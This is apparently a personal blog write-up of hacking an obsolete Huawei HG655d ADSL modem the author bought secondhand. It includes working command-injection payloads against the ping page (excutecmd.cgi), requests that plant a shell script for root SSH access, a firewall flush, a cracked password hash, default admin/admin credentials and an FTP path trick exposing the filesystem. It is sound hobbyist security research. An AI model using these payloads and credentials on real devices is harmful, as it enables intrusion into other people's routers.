---
layout: post
title: "Hacking the Huawei HG655d"
thumbnail: huawei-router-480.jpg
date: 2018-02-28
---

The Huawei HG655d is an obsolete ADSL modem. I found some vulnerabilities in its admin interface.

<!-- photo is own work -->

## Introduction

I bought this ADSL modem for &euro;4 in the thrift-shop in order to get a new hacking challenge. Hardware like this is often an easy target. It has several interfaces running on its own hardware. You don't need permission from anyone  to hack it and you don't need to install anything to run it. If it breaks, a simple reset makes it possible to continue. Furthermore, they are often full of vulnerabilities.

## Command injection in ping

The modem's web interface has the functionality to ping IP addresses. This is a feature that is commonly vulnerable to command injection, as the entered IP address is copied into a command as argument to `ping`. The page that handles this request is conveniently named `excutecmd.cgi`, and the response includes the output from the ping command:

    var PingResult = "PING 127.0.0.1 (127.0.0.1): 56 data bytes\n" + "64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.485 ms\n" + "64 bytes from 127.0.0.1: seq=1 ttl=64 time=0.332 ms\n" + "64 bytes from 127.0.0.1: seq=2 ttl=64 time=0.338 ms\n" + "64 bytes from 127.0.0.1: seq=3 ttl=64 time=0.332 ms\n" + "\n" + "--- 127.0.0.1 ping statistics ---\n" + "4 packets transmitted, 4 packets received, 0% packet loss\n" + "round-trip min/avg/max = 0.332/0.371/0.485 ms\n" + "";

First, I tried the payload `127.0.0.1;ls`. This fails, but only after a couple of seconds. This seems to indicate that our payload wasn't caught by any input validation, but rather interfered with the ping command. The payload `--help` doesn't give us the help text for ping. However, the payload `-c 1 127.0.0.1` correctly pings. After some tries, the payload `127.0.0.1;echo` gives an interesting result:

    var PingResult = "-c 4\n" + "";

This seem to be the remaining arguments to ping. The page runs `ping $INPUT -c 4`. Our payload ran `ping 127.0.0.1; echo -c 4`, which gave us `-c 4` in the PingResult. We can use this to run arbitrary commands. Let's try the payload `;echo $(ls)`:

    var PingResult = "var usr tmp sbin proc mnt linuxrc lib etc dev bin -c 4\n" + "";

This works, showing that we can run arbitrary commands on the device.

## Logging in over SSH

Nmap gave the following result:

    Starting Nmap 7.50 ( https://nmap.org ) at 2017-10-09 16:43 CEST
    Nmap scan report for 192.168.40.1
    Host is up (0.012s latency).
    Not shown: 996 closed ports
    PORT    STATE    SERVICE
    22/tcp  filtered ssh
    23/tcp  open     telnet
    80/tcp  open     http
    443/tcp open     https

    Nmap done: 1 IP address (1 host up) scanned in 2.66 seconds

It seems that there is an SSH service, but it is filtered by the firewall. We can confirm that by running `netstat -l` using our command injection. That indeed shows something running on port 22. We can now also use the command injection to disable the firewall. By running `iptables -F INPUT` we flush all firewall rules and the SSH port is now exposed.

    # ssh root@192.168.40.1
    Unable to negotiate with 192.168.40.1 port 22: no matching key exchange method found. Their offer: diffie-hellman-group1-sha1

However, it runs some old version of SSH and uses old algorithms that are disabled in modern versions. We can explicitly enable them in the client:

    # ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oCiphers=3des-cbc root@192.168.40.1
    root@192.168.40.1's password: 
    Permission denied, please try again.

So now we can connect with SSH but we don't know the password.

## Cracking the password

Using our command injection, we retrieve `/etc/passwd`:

    0:Eh/.Fe0Q0yDIc:0:0:root:/home:/bin/sh
    ftp:B6GbxkUCDwEx2:0:0:ftp user:/mnt:/bin/sh

Two users. The root user seems to be called `0` instead of `root`, and the user `ftp` also seems to have user ID 0. Let's try to crack the passwords:

    $ cudaHashcat64.bin hg655d.txt weakpass.lst -m 1500
    ...
    B6GbxkUCDwEx2:
    Eh/.Fe0Q0yDIc:root
    
The ftp user has an empty password, and the root user has "root" as password. I already tried those passwords, and SSH won't give access. Maybe it is configured to deny password logins, or it is some embedded SSH server that doesn't work the way I assume it does.

After a quick search, I found credentials for [another modem](https://www.exploit-db.com/exploits/38663/): admin/admin. This works, but doesn't give a Linux shell:

    # ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oCiphers=3des-cbc admin@192.168.40.1
    admin@192.168.40.1's password: admin
    -------------------------------
    -----Welcome to ATP Cli------
    -------------------------------
    ATP>shell
    shell
    ATP>ls
    ls
    Command failed.
    ATP>

## Enable FTP

Our modem also has FTP functionality. You can attach an external USB storage device and access it over FTP. Let's enable it, on the USB tab.

If we connect, we see an empty directory. Earlier we saw that the home directory of the ftp user is /mnt, which would make sense as a place where external storage devices are mounted. 

The FTP enable page shows this in the source:

    var DownloadInfo =new Array(new stDownloadInfo("InternetGatewayDevice.DeviceInfo.X_ServiceManage","1","ftp","","21","/mnt"),null)

And it posts these values to the setcfg.cgi script:
    
    x.FtpEnable=1&x.FtpUserName=ftp&x.FtpPassword=&x.FtpPort=21

Maybe we can just set x.FtpPath to / and we will get access to the root. We send the following request:

    x.FtpEnable=1&x.FtpUserName=ftp&x.FtpPassword=&x.FtpPort=21&x.FtpPath=/

Log in over FTP, and we have access to the root directory.

Unfortunately, we have read-only access. If we try to upload a file, we get the error

    553 Error: mapped /mnt/cli. Only support write operation in USB storage device!

## SSH again

Using our FTP access, we download the sshd binary. Running `strings` on it gives some interesting information:

    $ strings sshd
    ...
    echo 0 >/var/sshclilevel.cfg 2>/dev/null
    echo 1 >/var/sshclilevel.cfg 2>/dev/null

However, trying both values in this file doesn't change the ATP shell to a real shell. I tried using radare2 to search for the code that handles the "shell" command, but I couldn't get it to work.

Other interesting strings in the binary include "/bin/cli" and "/var/cli". This could be the binary that provides the shell. Maybe we could replace this by a real shell. We symlink /var/cli to /bin/sh using our command injection (`ln -s /bin/sh /var/cli`). This does do something, but not what we want:

    # ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oCiphers=3des-cbc admin@192.168.40.1
    admin@192.168.40.1's password: admin
    sshd_cli: applet not found
    Connection to 192.168.40.1 closed.

The "applet not found" error is from busybox. Busybox is one binary that implements multiple unix commands. In our modem, `/bin/sh` is actually a symlink to busybox. Because busybox is called with `sh` as its program name it knows to start the shell. Apparently, our program is started with the `sshd_cli` filename, and busybox doesn't know how to handle that. Let's remove our cli program and put a shell script in its place.

    POST /html/management/excutecmd.cgi?ip=;echo%20$(rm%20/var/cli)
    POST /html/management/excutecmd.cgi?ip=;echo%20$(echo%20'#!/bin/sh'>>/var/cli)
    POST /html/management/excutecmd.cgi?ip=;echo%20$(echo%20'/bin/sh'>>/var/cli)
    POST /html/management/excutecmd.cgi?ip=;echo%20$(chmod%20755%20/var/cli)

Now we try to SSH again:

    root@scanlaptop:~# ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oCiphers=3des-cbc admin@192.168.40.1
    admin@192.168.40.1's password: admin
    ls
    var
    usr
    tmp
    sbin
    proc
    mnt
    linuxrc
    lib
    etc
    dev
    bin

It works! We don't get a prompt, but we can execute shell commands over SSH.

## Hacking more web functionality

To get more information on the web interface, we download /bin/web. That does seem to contain the webserver, but not the webpages. For example, it doesn't contain the string "PingResult", which we saw in the ping page. There are many web pages, which would take up a relatively large amount of disk space. By sorting on filesize in the FTP client, I find /etc/webimg after a while. This contains HTML, with some kind of ASP server-side tags:

    var PingResult = <%webGetExcuteCmdResult();%>;

All the HTML pages in webimg are concatenated. But beside webimg is also webidx, which seems to be some index into webimg:

    pin.asp 8523 38157
    pinerrcode.asp 1127 46680

There are also some interesting looking filenames:

    path:html/html/management
    firmware.asp 3281 342461
    account.asp 6231 345742
    accountadvance.asp 5504 351973
    newmt@$%rE!s5&yuSht.asp 374 357477

When requesting http://192.168.40.1/html/management/newmt@$%rE!s5&yuSht.asp, we get an error "file not foud", but this is different from other non-existing pages. In the webimg we can see this page calls `DoFactorySpecailEnable`, but I can't find it in the web binary.

If we asume that the webidx contains filename, length, offset, we can extract all the files from webimg. I wrote the following Python script to do that:

    import os

    with open('webimg') as img:
        with open('webidx') as idx:
            for line in idx:
                line = line.strip()
                if line.startswith('path:'):
                    path = line[5:]
                    os.makedirs(path)
                else:
                    (filename, length, offset) = line.split()
                    filepath = "%s/%s" % (path, filename)
                    with open(filepath, 'wb') as dest:
                        img.seek(int(offset))
                        dest.write(img.read(int(length)))


This works, but does not export the page for every URL. For example, our "excutecmd.cgi" is not among the HTML pages. Apparently this is exclusively handled by /bin/web.

## FTP again

I got nowhere with radare2, and only `strings` gave some valuable information. I ran `strings` on some more binaries, like telnetd and bftpd. The last one gave some interesting values:

    # strings bftpd
    ...
    command_adminlogin
    421 Login incorrect.
    Administrative login FAILED
    ADMIN_PASS
    %30s %30s
    root
    230 Administrative login successful.
    Administrative login SUCCESSFUL
    ADMIN_GETCONF
    ADMIN_LOG
    ADMIN_STOPLOG
    ADMIN_WHO
    ADMIN_KICK
    ADMIN_QUIT
    
It seems our FTP server has administrative functionality. After logging in, it even shows in the help text:

    help 
    214-The following commands are recognized.
    214-USER
    ...
    214-FEAT
    214-ADMIN_LOGIN

This is also in the source of [bftpd](https://sourceforge.net/projects/bftpd/). Unfortunately, by default no password seems to be configured.

## Conclusion

This hacking spree resulted in total compromise, where I could run commands as root. I found several vulnerabilities in the web interface. Furthermore, I obtained some information from the binaries running on the modem.
